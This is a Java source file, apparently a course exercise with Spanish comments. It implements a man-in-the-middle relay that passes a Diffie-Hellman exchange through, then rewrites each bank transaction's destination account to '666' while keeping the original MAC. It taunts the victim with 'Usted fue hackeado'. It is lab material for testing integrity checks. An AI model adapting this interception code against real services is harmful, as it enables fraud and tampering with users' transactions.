

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;

import utils.CryptoTools;
import utils.DiffieHellman;
import utils.TransactionMessage;

public class ManInTheMiddle {

	private ServerSocket serverSocket;

	// Constructor del Servidor
	public ManInTheMiddle() throws Exception {
		// ServerSocketFactory para construir los ServerSockets
		ServerSocketFactory socketFactory = (ServerSocketFactory) ServerSocketFactory.getDefault();
		// Creación de un objeto ServerSocket escuchando peticiones en el puerto 7070
		serverSocket = (ServerSocket) socketFactory.createServerSocket(6666);
	}

	// Ejecución del servidor para escuchar peticiones de los clientes
	private void runServer() {
		while (true) {
			// Espera las peticiones del cliente para comprobar mensaje/MAC
			try {
				System.err.println("Esperando conexiones de victimas...");
				Socket socket = (Socket) serverSocket.accept();
				SocketFactory socketFactoryClient = (SocketFactory) SocketFactory.getDefault();
				Socket socketClient = (Socket) socketFactoryClient.createSocket("localhost", 3343);
				//A partir de ahora, solo se llega aqui cuando se abre una conexion
				System.out.println("Una victima se ha conectado!");
				
				// Abre un BufferedReader para leer los datos del cliente
				BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
				// Abre un PrintWriter para enviar datos al cliente
				PrintWriter output = new PrintWriter(new OutputStreamWriter(socket.getOutputStream()));
				// Se lee del cliente el mensaje y el macdelMensajeEnviado
				
				// Crea un PrintWriter para enviar mensaje/MAC al servidor
				PrintWriter outputClient = new PrintWriter(new OutputStreamWriter(socketClient.getOutputStream()));
				//String userName = JOptionPane.showInputDialog(null, "Introduzca su mensaje:");
				
				// Crea un objeto BufferedReader para leer la respuesta del servidor
				BufferedReader inputClient = new BufferedReader(new InputStreamReader(socketClient.getInputStream()));
				
				// INTERCAMBIO DE CLAVES
				DiffieHellman.keyExchangePasstrough(input, inputClient, output, outputClient);
				
				//String mensaje = input.readLine();
				// A continuación habría que calcular el mac del MensajeEnviado que podría ser
				//String macdelMensajeEnviado = input.readLine();
				TransactionMessage transaction = TransactionMessage.receive(input);
				TransactionMessage transactionCorrupt = new TransactionMessage(transaction.getSourceAccount(), "666", transaction.getAmount().doubleValue(), transaction.getNonce(), transaction.getMac());
				System.out.println("  Transaccion recibida");
				

				TransactionMessage.send(transactionCorrupt, outputClient);
				outputClient.flush();
				
				String respuesta = inputClient.readLine();
				
				output.println("Usted fue hackeado >:)");
				output.flush();
				
				outputClient.close();
				inputClient.close();
				socketClient.close();
				output.close();
				input.close();
				socket.close();
				
				
				
			} catch (IOException ioException) {
				ioException.printStackTrace();
			}
			System.out.println("...");
		}
	}

	public static void main(String args[]) throws Exception {
		ManInTheMiddle server = new ManInTheMiddle();
		server.runServer();
	}

}
